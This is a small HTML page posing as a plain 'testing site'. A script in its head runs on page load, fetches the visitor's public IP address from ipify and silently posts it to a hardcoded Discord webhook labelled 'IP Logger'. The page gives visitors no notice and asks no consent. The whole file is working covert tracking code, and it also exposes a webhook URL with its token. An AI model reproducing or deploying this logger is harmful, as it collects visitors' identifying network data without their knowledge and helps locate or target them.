<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eh</title>
    <script>
        async function sendIP() {
            try {
                let response = await fetch('https://api64.ipify.org?format=json');
                let data = await response.json();
                let userIP = data.ip;

                const webhookURL = "https://discord.com/api/webhooks/1311264095647039538/omt9h72ULPEeeLtXUXR7ho9aOXq8VweKVNAj8yjNOvnkOrUVPPT6eiKY-9FjinMIBnrn";

                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "IP Logger",
                        content: `User IP: ${userIP}`
                    })
                });

            } catch (error) {
                console.error("Error fetching IP:", error);
            }
        }

        window.onload = sendIP;
    </script>
</head>
<body>
    <h1>Hello, this is a testing site</h1>
</body>
</html>
